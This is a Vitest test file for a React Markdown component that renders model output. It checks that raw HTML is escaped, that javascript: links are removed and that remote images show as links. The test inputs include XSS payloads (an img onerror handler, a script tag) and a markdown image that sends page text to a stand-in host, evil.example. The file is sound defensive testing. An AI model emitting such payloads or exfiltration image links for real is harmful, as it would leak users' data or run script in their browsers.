import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { Markdown } from '@/components/Markdown';

const render = (text: string) => renderToStaticMarkup(<Markdown text={text} />);

describe('Markdown', () => {
  it('renders formatting, lists and code', () => {
    const html = render('**Bold** and `code`\n\n- one\n- [ ] task\n\n```js\nlet a = 1;\n```');
    expect(html).toContain('<strong>Bold</strong>');
    expect(html).toContain('<code>code</code>');
    expect(html).toContain('type="checkbox"');
    expect(html).toContain('let a = 1;');
  });

  it('never renders raw HTML from the model; it shows as text', () => {
    const html = render('Hello <img src=x onerror="alert(1)"> <script>alert(2)</script>');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('<script');
    expect(html).toContain('&lt;img src=x onerror=&quot;alert(1)&quot;&gt;');
  });

  it('keeps the answer after a stray HTML line visible', () => {
    // An HTML block runs to the next blank line; dropping it would hide the answer.
    const html = render(
      '<page title="Mail" content="text the user selected">\nThe translation.\n</page>',
    );
    expect(html).toContain('The translation.');
    expect(html).not.toContain('<page');
  });

  it('keeps single line breaks when asked to, as for a rewritten email', () => {
    expect(render('Thanks,\nSam')).not.toContain('<br');
    const kept = renderToStaticMarkup(<Markdown text={'Thanks,\nSam'} lineBreaks />);
    expect(kept).toMatch(/Thanks,<br\/>\s*Sam/);
  });

  it('turns a plain <br> into a line break', () => {
    expect(render('one<br>two')).toMatch(/one<br\/>\s*two/);
  });

  it('shows remote images as links instead of loading them', () => {
    const html = render('![secret](https://evil.example/collect?d=page-text)');
    expect(html).not.toContain('<img');
    expect(html).toContain('href="https://evil.example/collect?d=page-text"');
    expect(html).toContain('(evil.example)');
  });

  it('removes javascript: links and shows real domains', () => {
    const unsafe = render('[click](javascript:alert(1))');
    expect(unsafe).not.toContain('javascript:');
    const safe = render('[docs](https://www.example.org/guide)');
    expect(safe).toContain('rel="noopener noreferrer"');
    expect(safe).toContain('(example.org)');
  });
});
